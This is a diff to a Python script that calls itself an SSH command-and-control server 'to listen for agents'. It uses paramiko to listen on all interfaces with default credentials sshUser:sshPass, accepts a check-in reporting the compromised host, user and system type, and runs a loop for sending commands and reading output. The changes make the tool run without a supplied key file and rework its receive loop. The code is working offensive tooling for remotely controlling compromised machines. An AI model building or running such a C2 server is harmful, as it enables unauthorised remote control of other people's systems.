@@ -7,16 +7,12 @@ import time
 
 parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
 parser._action_groups.pop()
-required = parser.add_argument_group("Required")
+#required = parser.add_argument_group("Required")
 optional = parser.add_argument_group("Optional")
-required.add_argument("-f", dest="key_file", help="Key File")
+#required.add_argument("-f", dest="key_file", help="Key File")
 optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
 optional.add_argument("-u", dest="user", default="sshUser", help="Server user (Default: sshUser)")
 optional.add_argument("-pwd", dest="password", default="sshPass", help="Server password (Default: sshPass)")
-
-if (len(sys.argv) == 1):
-    parser.print_help(sys.stderr)
-    sys.exit()
 
 args = parser.parse_args()
 
@@ -26,14 +22,15 @@ class SSHServer (paramiko.ServerInterface):
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
     def check_auth_password(self, username, password):
-        if (username == args.user) and (password == args.password): #Configure your own username and password for the server (Default is sshUser:sshPass)
+        if (username == args.user) and (password == args.password): #Configure username and password for the server (Default is sshUser:sshPass)
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
 def main():
     server = "0.0.0.0" #To listen on all interfaces
     port = args.port
-    HOSTKEY = paramiko.RSAKey(filename=os.path.join(args.key_file)) #Provide private Key File via -f flag
+    #HOSTKEY = paramiko.RSAKey(filename=os.path.join(args.key_file))
+    HOSTKEY = paramiko.RSAKey.generate(2048)
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,14 +40,14 @@ def main():
         print("[*] Listening for connections...")
         client, addr = sock.accept()
     except KeyboardInterrupt:
-        quit()
+        sys.exit()
 
     C2_Session = paramiko.Transport(client)
     C2_Session.add_server_key(HOSTKEY)
     server = SSHServer()
     C2_Session.start_server(server=server)
     conn = C2_Session.accept()
-    print("[*] Debug info:\n" + str(conn)) #Debug info
+    print("\n[*] Debug info:\n" + str(conn)) #Debug info
     if conn is None:
         print("[!] Failled authentication.")
         sys.exit()
@@ -58,7 +55,7 @@ def main():
     host = success_msg.split(",")[0]
     user = success_msg.split(",")[1]
     type = success_msg.split(",")[2]
-    print(f"[*] Agent checked in from \"{host}\" ({type}) as \"{user}\".\n")
+    print(f"\n[*] Agent checked in from \"{host}\" ({type}) as \"{user}\".\n")
     conn.send(" ") #Connection breaks without this line
 
     def comm_handler():
@@ -84,10 +81,17 @@ def main():
                 sys.exit()
     
     def incoming():
-        time.sleep(1)
-        while conn.recv_ready():
-            print(conn.recv(4096).decode())
-        comm_handler()
+        try:
+            if (conn.recv_ready() == False):
+                time.sleep(1)
+                incoming()
+            else:
+                while conn.recv_ready():
+                    print(conn.recv(4096).decode())
+                comm_handler()
+        except Exception as ex:
+            print(str(ex))
+            comm_handler()
 
     comm_handler()
 
